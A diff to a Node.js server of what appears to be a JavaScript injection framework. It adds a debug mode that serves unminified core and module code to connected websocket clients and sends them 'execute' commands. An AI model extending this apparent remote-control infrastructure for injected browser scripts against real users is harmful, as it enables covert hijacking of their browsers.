@@ -40,6 +40,7 @@ const injector		= require('./inject.js')
 
 const inject = {
 	core    		: UglifyJS.minify(fs.readFileSync('./inject/core.js', 'utf8')).code,
+	debugCore		: fs.readFileSync('./inject/core.js', 'utf8'),
 	modules 		: {},
 	debugModules	: {},
 	clients			: []
@@ -965,9 +966,13 @@ MongoClient.connect(config.mongodb, function(err, db) {
 	injectServer.on('connection', socket => {
 		let checkIfValid = socket => {
 			return new Promise((resolve, reject) => {
-				let project = socket.url.split('?')
+				let project = socket.url.split('?'),
+					debug   = false
 				project = project[project.length - 1]
-				if (project.charAt(0) == "$") project = project.substring(1)
+				if (project.charAt(0) == "$") {
+					project = project.substring(1)
+					debug = true
+				}
 				if (!project) {
 					reject('websocket connection with invalid / missing project name, terminating')
 					return
@@ -980,10 +985,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 						if(doc == null) {
 							reject('websocket connection to nonexistent project, terminating')
 						} else {
-							console.log(socket)
 							resolve({
 								project : doc.name,
 								id      : + new Date(),
+								debug	: debug
 							})
 						}
 					})
@@ -999,6 +1004,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			)
 		}
 		checkIfValid(socket).then(data => {
+			let { debug } = data
 			if (config.debug) console.log(
 				chalk.greenBright("[inject] ") + 
 				chalk.yellowBright("new websocket connection for project ") +
@@ -1009,7 +1015,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				project : data.project,
 				socket  : socket,
 			})
-			send('core', inject.core)
+			if (debug) {
+				send('core', inject.debugCore)
+			} else {
+				send('core', inject.core)
+			}
 			send('execute', 'injectify.send("d")')
 
 			socket.on('data', rawData => {
@@ -1030,7 +1040,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 
 				on('module', data => { // load a module
 					if (!data.name) return
-					let javascript = inject.modules[data.name]
+					if (debug) {
+						var javascript = inject.debugModules[data.name]
+					} else {
+						var javascript = inject.modules[data.name]
+					}
 					if (javascript) {
 						try {
 							if (data.params) javascript = 'var module={name:' + JSON.stringify(data.name) + ',params:' + JSON.stringify(data.params) + '};' + javascript
